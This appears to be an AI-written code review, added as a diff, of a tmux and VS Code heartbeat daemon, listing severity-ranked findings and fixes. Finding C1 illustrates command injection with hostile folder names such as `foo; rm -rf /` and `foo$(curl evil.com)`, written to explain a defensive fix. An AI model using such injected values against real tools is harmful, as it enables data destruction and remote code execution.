@@ -1,0 +1,254 @@
+================================================================================
+CODE REVIEW: Unix Domain Socket Heartbeat System
+Reviewer: Claude Opus 4.6 (1M context)
+Date: 2026-03-14
+================================================================================
+
+SUMMARY
+-------
+Overall the changeset is solid — clean module boundaries, good test coverage,
+sensible fallback logic. The review identified 2 Critical issues, 3 High,
+5 Medium, 3 Low, and 3 Nits. The critical items are a command injection vector
+in shell commands built from user-controlled repo names and a race condition
+in the heartbeat timeout check loop that mutates the map during iteration.
+
+================================================================================
+FINDINGS
+================================================================================
+
+--- CRITICAL ---
+
+[C1] Command injection via repo basename in tmux session names and task commands
+  File: src/cli/pick-repo.ts:104, src/ide/index.ts:156
+  What: `basename(repoRoot)` is interpolated directly into a shell command
+        string passed to tmux and into VS Code task `command` fields. A repo
+        folder named `foo; rm -rf /` or `foo$(curl evil.com)` would inject
+        arbitrary commands.
+  Why:  repoRoot comes from the folder picker (user-controlled path on disk).
+        While exploitation requires a maliciously named directory, the pattern
+        is dangerous by default. The tmux session name in pick-repo.ts line 104
+        (`const daemonCmd = ...`) is a string passed as a single arg to
+        execFileAsync (which is safe from shell expansion), BUT the
+        addDaemonMonitorTask command at ide/index.ts:156 is a VS Code task
+        `command` field that IS interpreted by the shell:
+          `tmux attach -t ${basename(repoRoot)}_daemon`
+        Similarly, addTmuxTask (line 107) and addHeartbeatTask (line 129) embed
+        unsanitized values into shell command strings.
+  Fix:  Sanitize `basename(repoRoot)` the same way worktree names are
+        sanitized (strip shell metacharacters), or quote/escape the value.
+        For task commands, use the VS Code `args` array format instead of
+        inlining into `command` strings. At minimum, reject or escape
+        characters like `;`, `$`, backtick, `|`, `&`, `(`, `)` in session
+        names.
+
+[C2] Race condition: mutating Map during iteration in heartbeat check loop
+  File: src/daemon/server.ts:151-155
+  What: The `for...of` loop iterates `heartbeats` and calls
+        `cleanupWorktree()` which does `heartbeats.delete(worktreeName)` on
+        line 79. Deleting keys from a Map while iterating it with `for...of`
+        is technically safe in ES2015+ (the spec guarantees it), but
+        `cleanupWorktree` is async and not awaited. Multiple async cleanups
+        can run concurrently for different worktrees, and the next interval
+        tick can fire while previous cleanups are still in flight, potentially
+        triggering duplicate cleanup calls for the same worktree.
+  Why:  Could result in double `git worktree remove --force` and double
+        `tmux kill-session` calls, leading to confusing errors or — worse —
+        removing a worktree that was re-registered between the check and the
+        async cleanup completing.
+  Fix:  Either:
+        (a) Collect expired worktrees into an array first, delete them from
+            the map immediately (before async work), then run cleanups; or
+        (b) Add a `cleaningUp: Set<string>` guard so a worktree in active
+            cleanup is skipped on subsequent ticks; or
+        (c) Await each cleanup sequentially (simplest but slower).
+
+--- HIGH ---
+
+[H1] Non-null assertion on repoRoot when visible=true but repoRoot is optional
+  File: src/ide/index.ts:202, 223
+  What: `repoRoot!` is used with a non-null assertion in both the existing-file
+        and new-file branches. The `visible` parameter is independent of
+        `repoRoot`, so it's possible to call
+        `writeWorktreeTasksFile(path, name, undefined, true)` which would
+        pass `undefined` to `addDaemonMonitorTask`, producing a task with
+        command `tmux attach -t undefined_daemon`.
+  Why:  Silent malfunction — the daemon monitor task would try to attach to a
+        non-existent tmux session named "undefined_daemon".
+  Fix:  Guard the `visible` block with `if (visible && repoRoot)` instead of
+        just `if (visible)`, or make `repoRoot` required when `visible` is
+        true (enforce via types or runtime check).
+
+[H2] Log file contention — daemon and heartbeat client write to the same file
+  File: src/cli/daemon.ts:30, src/cli/heartbeat.ts:23
+  What: Both the daemon process and every heartbeat client process compute
+        `join(getSocketDir(), "daemon.log")` and use `appendFileSync` to write
+        to the same file concurrently. On macOS/Linux, `write()` to a regular
+        file with O_APPEND is atomic for small writes (< PIPE_BUF, typically
+        4KB), so individual lines won't interleave. However, multiple daemon
+        instances for different repos all write to the same single
+        "daemon.log" file, making logs a jumbled mess.
+  Why:  Diagnostics become useless when multiple repos' daemon and heartbeat
+        logs are interleaved in one file with no repo identifier in most log
+        lines.
+  Fix:  Include the socket hash or repo basename in the log filename, e.g.
+        `daemon-${hash}.log`, so each repo gets its own log file. Or prefix
+        every log line with the repo identifier.
+
+[H3] Heartbeat worktree name is not quoted in the task command string
+  File: src/ide/index.ts:129
+  What: The heartbeat task command is:
+          `node "..." --repo-root "${repoRoot}" --worktree ${worktreeName}`
+        Note `--worktree ${worktreeName}` lacks quotes. If a worktree name
+        contains spaces (after sanitization this shouldn't happen, but the
+        sanitizer does allow `/` and `-`), the shell would split it.
+  Why:  Inconsistency — repoRoot is quoted but worktreeName is not. While the
+        sanitizer currently strips spaces, this is a fragile coupling between
+        the sanitizer and the command builder.
+  Fix:  Quote it: `--worktree "${worktreeName}"` for defensive consistency.
+
+--- MEDIUM ---
+
+[M1] No timeout/failure log after socket poll exhaustion
+  File: src/cli/pick-repo.ts:119-127
+  What: The poll loop runs for up to 5 seconds, but if the socket never comes
+        alive, execution silently continues to IDE setup. There's no warning
+        logged, so the user has no idea the daemon didn't start.
+  Why:  The heartbeat task will start sending to a dead socket, logging
+        "Daemon not reachable" every 5 seconds with no explanation of why.
+  Fix:  After the while loop, check `isSocketAlive` one final time and log a
+        warning if it's still not alive:
+          `console.warn("[pick-repo] WARNING: Daemon socket not ready after 5s");`
+
+[M2] Session header in log file lacks a newline-terminated timestamp prefix
+  File: src/daemon/server.ts:62-70
+  What: The session header block written to the log file does not use the
+        `logToFile()` helper and has a different format (no `[timestamp]`
+        prefix). This means the header lines cannot be parsed by the same
+        log-parsing logic as regular lines.
+  Why:  Minor inconsistency, but makes automated log parsing harder.
+  Fix:  Either route through `logToFile()` or add ISO timestamps to each
+        header line.
+
+[M3] Missing semicolon on logToFile call
+  File: src/daemon/server.ts:122
+  What: `logToFile(...)` on line 122 is missing a trailing semicolon. The
+        project appears to use semicolons consistently elsewhere.
+  Why:  Style inconsistency. ASI handles it, but it's a linting violation in
+        a semicolon-required codebase.
+  Fix:  Add the semicolon.
+
+[M4] Daemon log file grows without bound
+  File: src/daemon/server.ts:53-54
+  What: `appendFileSync` is used for all logging with no rotation strategy.
+        In a long-running session with 5-second heartbeats, the log grows at
+        ~17 KB/hour (~400 KB/day) per worktree.
+  Why:  On a developer machine running for weeks, this could accumulate
+        hundreds of MB in /tmp. /tmp is often a ramdisk on Linux.
+  Fix:  Implement simple size-based rotation (check file size every N writes,
+        truncate or rotate when it exceeds a threshold like 1MB), or at
+        minimum, document that logs are in /tmp and will be cleaned on reboot.
+
+[M5] tmux session name collision across different parent directories
+  File: src/cli/pick-repo.ts:103
+  What: `sessionName = ${repoBasename}_daemon` uses only the final directory
+        name. Two repos at `/home/user/project` and `/opt/builds/project`
+        would collide on session name `project_daemon`.
+  Why:  The second daemon launch would fail silently (tmux "duplicate session"
+        error caught by the catch block), falling back to detached spawn but
+        also potentially attaching the monitor task to the wrong daemon.
+  Fix:  Include a short hash in the session name, matching the socket path
+        strategy: `${repoBasename}-${hash.slice(0,6)}_daemon`.
+
+--- LOW ---
+
+[L1] `reloadIdeWindow` is exported but no longer called
+  File: src/ide/index.ts:236-258
+  What: The `reloadIdeWindow` function was removed from pick-repo.ts (the
+        import was dropped), but the function itself and its tests remain.
+  Why:  Dead code increases maintenance burden and test runtime. The test
+        file still imports and tests `reloadIdeWindow`.
+  Fix:  If the function is no longer needed, remove it and its tests. If it
+        may be needed later, add a comment explaining why it's retained.
+
+[L2] `heartbeatCount` is module-level mutable state
+  File: src/heartbeat/client.ts:24
+  What: `heartbeatCount` is a module-level `let` variable that persists across
+        calls. In tests, this means the seq number keeps incrementing across
+        test cases (which is why the test changed to `typeof parsed.seq` check
+        instead of asserting a specific value). This is fine for production
+        (single process), but makes tests order-dependent.
+  Why:  If someone later adds a test asserting `seq === 1`, it would be flaky
+        depending on test execution order.
+  Fix:  Export a `resetHeartbeatCount()` function for test use, or accept the
+        current `typeof` assertion approach (which is reasonable).
+
+[L3] Fallback spawn in pick-repo doesn't pass `--silent` flag
+  File: src/cli/pick-repo.ts:111
+  What: When tmux is unavailable and the daemon is spawned via
+        `spawn("node", [daemonPath, selection.repoRoot], ...)`, the `--silent`
+        flag is not forwarded. The tmux path also doesn't pass `--silent`
+        (the daemonCmd string on line 104).
+  Why:  Daemon will be noisy in both cases, but since tmux output goes to the
+        tmux session and the detached spawn has `stdio: "ignore"`, this is
+        mostly a consistency issue rather than a user-facing problem.
+  Fix:  Low priority, but for consistency, consider whether `--silent` should
+        be forwarded in both launch paths.
+
+--- NIT ---
+
+[N1] Unused import: `reloadIdeWindow` is still imported in test/ide.test.ts
+  File: test/ide.test.ts:6
+  What: The test file imports `reloadIdeWindow` which is tested but the
+        function is no longer used in production code (see L1).
+  Why:  If L1 is addressed by removing the function, this import and its
+        tests need to go too.
+
+[N2] Inconsistent log tag — daemon uses `[daemon]`, heartbeat uses `[heartbeat]`
+  File: src/daemon/server.ts, src/heartbeat/client.ts
+  What: Both processes write to the same log file but use different tags.
+        This is actually helpful for distinguishing sources, but since the
+        heartbeat client writes `[heartbeat] Sent #N` and the daemon writes
+        `[daemon] Received heartbeat #N`, the log reads well. This is fine.
+  Why:  n/a — marking as a nit to confirm this was intentional, which it
+        appears to be.
+
+[N3] Consider using a signal to detect IDE close instead of heartbeat absence
+  What: The current design relies on heartbeat timeout (15s default) to detect
+        IDE closure. An alternative would be to trap SIGTERM/SIGHUP in the
+        heartbeat process and send an explicit "goodbye" message to the daemon.
+        VS Code kills terminal processes with SIGTERM on window close.
+  Why:  Would reduce cleanup latency from ~15s to near-instant. The current
+        approach is more resilient (works even if the process is killed with
+        SIGKILL), but a belt-and-suspenders approach would give faster
+        feedback in the common case.
+  Fix:  Add a SIGTERM handler in heartbeat.ts that sends a `{ type: "goodbye",
+        worktree }` message before exiting, and handle it in the daemon to
+        trigger immediate cleanup.
+
+================================================================================
+ARCHITECTURE NOTES
+================================================================================
+
+1. Module boundaries are clean — server.ts is testable in isolation, CLI
+   wrappers are thin, and the socket module is well-separated.
+
+2. The tmux fallback pattern in pick-repo.ts (try tmux, catch and spawn
+   detached) is pragmatic and appropriate for a developer tool.
+
+3. The polling loop replacing the fixed 500ms sleep is a significant
+   reliability improvement.
+
+4. Test coverage is good. The new visible-mode tests are thorough and cover
+   the key permutations (visible=true creates 4 tasks, visible=false creates
+   3, monitor attaches to correct session).
+
+================================================================================
+SEVERITY SUMMARY
+================================================================================
+  Critical:  2  (command injection, async cleanup race)
+  High:      3  (null assertion, log contention, unquoted arg)
+  Medium:    5  (poll timeout silence, header format, semicolon, log rotation,
+                 session name collision)
+  Low:       3  (dead code, module state, missing --silent)
+  Nit:       3  (unused import, log tags, goodbye signal)
+================================================================================
